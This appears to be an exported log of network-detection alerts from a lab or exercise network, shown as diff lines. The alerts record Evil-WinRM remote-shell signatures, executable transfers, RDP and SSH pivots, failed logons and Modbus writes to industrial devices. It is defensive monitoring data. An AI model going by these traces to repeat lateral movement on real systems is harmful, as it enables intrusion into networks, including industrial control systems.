+Medium,35300,2025-03-28T12:38:28Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35307,2025-03-28T12:40:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35310,2025-03-28T12:38:44Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35318,2025-03-28T12:41:06Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35327,2025-03-28T12:42:54Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35328,2025-03-28T12:41:58Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35329,2025-03-28T12:42:43Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Low,35330,2025-03-28T12:36:35Z,Communication,Configuration,New SMB Communication detected,"New SMB_FileInfo (version: ['SMB1', 'SMB2']) traffic between Asset:1832 and Asset:1759",New SMB Communication Detection,"1832,1759",,,10.0.4.11,10.0.4.43,,8140854f-ba8a-4fd7-8035-55f8ad46acb9,
+Low,35345,2025-03-28T12:41:57Z,Asset,Configuration,User-Agent First Seen from Host,Asset 1832 made an HTTP request with User-Agent Go-http-client/1.1 for the first time.,User Agent First Seen,1832,,,,,10.0.4.11,5dbcbec2-2276-4997-a4b8-ca4e57d564a1,
+Low,35347,2025-03-28T12:40:13Z,Communication,Configuration,Detected 6 RDP New Comms between 2025-03-28T12:29:02.870Z and 2025-03-28T12:40:13.834Z,"Sample RDP New Comms values include:
+  rdp_client_name: ;
+  dst__port: ('',);
+  ip_src: 10.0.1.29, 10.0.4.11, 10.0.8.11, 10.0.10.29, 10.0.8.43;
+  dst_asset_id: 1690, 45, 1919, 1763, 1779;
+  rdp_keyboard_layout: ;
+  ip_dst: 10.0.10.30, 10.0.4.29, 10.0.8.11, 10.0.8.43, 10.0.1.11;
+  rdp_selected_protocol: , hybrid_ex;
+  src__mac: ;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1690, 1832, 1801, 44, 1779;
+  dst__ip: ;
+  src__port: ('',);
+  rdp_rt_cookie: , plumber, nmap, nina, bart;
+  src__ip: ;",RDP New Comms Pattern,"1832,45,44,1779,1801,1919,1690,1763",,,"10.0.4.11,10.0.1.29,10.0.8.11,10.0.10.29,10.0.8.43","10.0.1.11,10.0.8.11,10.0.10.30,10.0.8.43,10.0.4.29",,,
+Medium,35354,2025-03-28T12:37:33Z,Communication,Threat Behavior,File Transfer of Executable,Host 10.0.4.11 (asset 1905) transferred file /c.exe (application/x-msdos-program) (sha256 b8040b40ce0bb552f35de7e8996ab57f17fd9546550fad1a06752d9c97a7aa80) to 10.0.4.30 (asset 1832).,File Transfer of Executable,"1905,1832",,,10.0.4.30,10.0.4.11,,7d3025ac-5e95-472a-9fcc-75f04d179f88,
+Medium,35355,2025-03-28T12:39:39Z,Communication,Threat Behavior,File Transfer of Executable,Host 10.0.4.11 (asset 1905) transferred file /c.exe (application/x-msdos-program) (sha256 8b9e1a78934b5522160ec11a67daca497c310fb5775feaae8f385a333d63dc86) to 10.0.4.30 (asset 1832).,File Transfer of Executable,"1905,1832",,,10.0.4.30,10.0.4.11,,d013fa54-7364-4814-895f-7704a0252921,
+Medium,35356,2025-03-28T12:40:05Z,Communication,Threat Behavior,File Transfer of Executable,Host 10.0.4.11 (asset 1905) transferred file /c.exe (application/x-msdos-program) (sha256 e96d975ea24de25eba7c234da5d22a9de2a6cd03105521eb91246b3ffe975d5a) to 10.0.4.30 (asset 1832).,File Transfer of Executable,"1905,1832",,,10.0.4.30,10.0.4.11,,ddb45a76-7a67-486a-882a-379464283b24,
+Medium,35357,2025-03-28T12:39:08Z,Communication,Threat Behavior,File Transfer of Executable,Host 10.0.4.11 (asset 1905) transferred file /c.exe (application/x-msdos-program) (sha256 409433d3d80d13631c11557ce9b8f15e06e4ba9cad2cd7f9e230bb6cd89bd81a) to 10.0.4.30 (asset 1832).,File Transfer of Executable,"1905,1832",,,10.0.4.30,10.0.4.11,,39fd30a5-b617-46e0-bc4c-891fb46f5fb1,
+Medium,35358,2025-03-28T12:39:26Z,Communication,Threat Behavior,File Transfer of Executable,Host 10.0.4.11 (asset 1905) transferred file /c.exe (application/x-msdos-program) (sha256 0621a4b822209e7f52e2d8bc3daaca9b3898ab9d6aa157260b3c71fef334f083) to 10.0.4.30 (asset 1832).,File Transfer of Executable,"1905,1832",,,10.0.4.30,10.0.4.11,,1aba4206-a537-48a6-a32c-c6029076340f,
+Medium,35359,2025-03-28T12:42:54Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35360,2025-03-28T12:43:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35361,2025-03-28T12:42:56Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35385,2025-03-28T12:44:10Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35387,2025-03-28T12:45:48Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35393,2025-03-28T12:47:04Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35394,2025-03-28T12:47:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35395,2025-03-28T12:47:55Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35396,2025-03-28T12:46:48Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35402,2025-03-28T12:47:54Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35407,2025-03-28T12:49:37Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35408,2025-03-28T12:51:04Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35410,2025-03-28T12:51:04Z,Indicator,Indicator,WinRM wsman Rapid Access - Possible Lateral Movement,WinRM wsman Rapid Access - Possible Lateral Movement,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35412,2025-03-28T12:50:37Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35419,2025-03-28T12:50:54Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35420,2025-03-28T12:51:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35425,2025-03-28T12:52:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35429,2025-03-28T12:53:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35431,2025-03-28T12:54:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35435,2025-03-28T12:55:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35443,2025-03-28T12:57:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35444,2025-03-28T12:56:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Low,35480,2025-03-28T12:15:26Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.4.11 (1832) to host 10.0.4.12 (1829). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1832,1829",,,10.0.4.11,10.0.4.12,,,
+Low,35482,2025-03-28T12:30:58Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.4.11 (1832) to host 10.0.4.29 (1763). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1832,1763",,,10.0.4.11,10.0.4.29,,,
+Medium,35535,2025-03-28T12:15:26Z,Communication,Threat Behavior,Multiple Events on Host,"Asset 1832 involved in 9 unique events: ['Logon', 'FileTransfer', 'Interactive Session', 'New Global User Agent', 'NewX509Certificate', 'RDP', 'File Transfer - Executable', 'NewSMBTraffic', 'RDP New Comms'].",Multiple Events on Host,"1832,1829",,,10.0.4.11,10.0.4.12,,,
+Low,35539,2025-03-28T12:51:04Z,Communication,Indicator,Failed HTTP Logon,"Asset 1759 (10.0.4.43) returned an HTTP response code of 401 'Unauthorized' to asset 1832 (10.0.4.11), which represents a failed logon attempt via HTTP by asset 1832. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1832,1759",,,10.0.4.43,10.0.4.11,,85b26925-7be1-487d-ba3e-705571c733a3,
+Medium,35546,2025-03-28T12:48:21Z,Communication,Threat Behavior,File Transfer of Executable,Host 10.0.4.11 (asset 1905) transferred file /win.exe (application/x-msdos-program) (sha256 ef0c30653a9bedcc0a548a6bf2279839cc3e3c1146767a7a46713f5d00589d7e) to 10.0.4.30 (asset 1832).,File Transfer of Executable,"1832,1905",,,10.0.4.30,10.0.4.11,,d94a4cf7-9f7c-43c5-a7aa-5d71470f8f72,
+Low,35554,2025-03-28T12:51:04Z,Asset,Configuration,User-Agent First Seen from Host,"Asset 1832 made an HTTP request with User-Agent Ruby WinRM Client (2.8.3, ruby 3.3.7 (2025-01-15)) for the first time.",User Agent First Seen,1832,,,,,10.0.4.11,27a94770-36a6-4ed7-9fba-638aec1b4df1,
+Medium,35560,2025-03-28T12:58:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35561,2025-03-28T12:59:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35568,2025-03-28T13:00:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35569,2025-03-28T13:01:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35577,2025-03-28T13:02:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35586,2025-03-28T13:04:32Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35587,2025-03-28T13:05:35Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35588,2025-03-28T13:06:42Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35589,2025-03-28T13:07:48Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35600,2025-03-28T13:09:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35601,2025-03-28T13:10:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35611,2025-03-28T13:11:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35618,2025-03-28T13:12:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Low,35640,2025-03-28T13:10:38Z,Communication,Indicator,Failed HTTP Logon,"Asset 1832 (10.0.4.11) returned an HTTP response code of 401 'Unauthorized' to asset 1905 (10.0.4.30), which represents a failed logon attempt via HTTP by asset 1905. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1832,1905",,,10.0.4.11,10.0.4.30,,35968322-3cf7-4134-a718-7998ca530ba3,
+Low,35654,2025-03-28T12:57:45Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 3968 (10.0.242.109) connected via SSH to asset 1832 (10.0.4.11) to then pivot to asset 1763 (10.0.4.29) via RDP.,Interactive Session Pivots,"1763,3968",,,10.0.242.109,10.0.4.29,,,
+Medium,35665,2025-03-28T13:12:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35681,2025-03-28T13:14:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35682,2025-03-28T13:13:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35687,2025-03-28T13:15:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35695,2025-03-28T13:16:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35705,2025-03-28T13:18:53Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35706,2025-03-28T13:19:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35707,2025-03-28T13:20:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35717,2025-03-28T13:21:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35718,2025-03-28T13:22:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35719,2025-03-28T13:23:35Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35720,2025-03-28T13:23:47Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35729,2025-03-28T13:23:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35731,2025-03-28T13:24:45Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35732,2025-03-28T13:24:32Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35740,2025-03-28T13:24:38Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35741,2025-03-28T13:25:18Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35752,2025-03-28T13:26:11Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35753,2025-03-28T13:25:19Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35765,2025-03-28T13:27:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35770,2025-03-28T13:28:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35771,2025-03-28T13:28:36Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35772,2025-03-28T13:29:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35773,2025-03-28T13:28:37Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Low,35794,2025-03-28T13:29:07Z,Communication,Configuration,Detected 58 NewModbusTCPCommunication between 2025-03-28T13:23:34.648Z and 2025-03-28T13:29:07.987Z,"Sample NewModbusTCPCommunication values include:
+  dst__port: ('',);
+  ip_src: 10.0.6.60, 10.0.8.60, 10.0.4.60, 10.0.4.74, 10.0.3.74, 10.0.7.60, 10.0.12.74, 10.0.2.74, 10.0.7.74, 10.0.12.60;
+  dst_asset_id: 569, 1940, 1662, 1945, 1881, 1827, 1870, 139, 1839, 1866;
+  modbus_unit_id: 1;
+  uuid: f99b7166-074c-49b3-b9cc-b1307d4479f0, f1014924-345e-423c-b279-7dd84abece49, 50102667-9195-4552-85a9-e49446a7c093, 387f6ac9-c501-48c8-a074-77d9cbdd9ad5, 51de78bb-b55e-4827-9826-709f8402dd57, 293ad670-a386-4459-a920-e393618c79be, 67df2f30-34ee-48ec-96dc-4115b369ca49, d71e7f37-9b68-47d4-b039-5215f400ae1c, 3ff1f76d-b482-419f-941f-a82e7627e03b, 877d9b3b-d656-46fa-b295-93c8b5455a56;
+  ip_dst: 10.0.6.60, 10.0.8.60, 10.0.4.60, 10.0.4.74, 10.0.3.74, 10.0.7.60, 10.0.12.74, 10.0.2.74, 10.0.7.74, 10.0.12.60;
+  src__mac: ;
+  dst__mac: ;
+  modbus_function_code_description: Read Input Registers, Read Holding Registers, Read Coils, Execute Operation, Read Discrete Inputs, Write Single Coil;
+  protocol: ;
+  modbus_exception_code_description: ;
+  src_asset_id: 569, 1940, 1662, 1945, 1827, 1870, 1881, 1926, 1839, 1866;
+  dst__ip: ;
+  src__port: ('',);
+  src__ip: ;",ModbusTCP New Function Code,"1839,1662,1866,1881,569,1940,1945,1827,1870,1926,139",,,"10.0.7.60,10.0.12.60,10.0.12.74,10.0.4.60,10.0.2.74,10.0.3.60,10.0.8.74,10.0.4.74,10.0.8.60,10.0.6.60","10.0.7.60,10.0.12.60,10.0.12.74,10.0.4.60,10.0.2.74,10.0.3.60,10.0.8.74,10.0.4.74,10.0.8.60,10.0.2.60",,"f99b7166-074c-49b3-b9cc-b1307d4479f0, f1014924-345e-423c-b279-7dd84abece49, 50102667-9195-4552-85a9-e49446a7c093, 387f6ac9-c501-48c8-a074-77d9cbdd9ad5, 51de78bb-b55e-4827-9826-709f8402dd57, 293ad670-a386-4459-a920-e393618c79be, 67df2f30-34ee-48ec-96dc-4115b369ca49, d71e7f37-9b68-47d4-b039-5215f400ae1c, 3ff1f76d-b482-419f-941f-a82e7627e03b, 877d9b3b-d656-46fa-b295-93c8b5455a56",
+Medium,35801,2025-03-28T13:29:54Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35803,2025-03-28T13:30:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35804,2025-03-28T13:30:12Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35805,2025-03-28T13:30:42Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35809,2025-03-28T13:32:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35810,2025-03-28T13:31:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35811,2025-03-28T13:31:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35812,2025-03-28T13:32:19Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35813,2025-03-28T13:33:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35814,2025-03-28T13:32:17Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35815,2025-03-28T13:35:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35816,2025-03-28T13:34:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35818,2025-03-28T13:35:35Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35819,2025-03-28T13:36:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35820,2025-03-28T13:37:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35826,2025-03-28T13:38:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35827,2025-03-28T13:39:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35829,2025-03-28T13:40Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35830,2025-03-28T13:39:29Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35831,2025-03-28T13:40:15Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35838,2025-03-28T13:40:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35840,2025-03-28T13:41:46Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35841,2025-03-28T13:41:43Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35842,2025-03-28T13:41:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35843,2025-03-28T13:42:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35844,2025-03-28T13:43:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35878,2025-03-28T13:44:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35898,2025-03-28T13:45:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35900,2025-03-28T13:46:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35903,2025-03-28T13:47:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
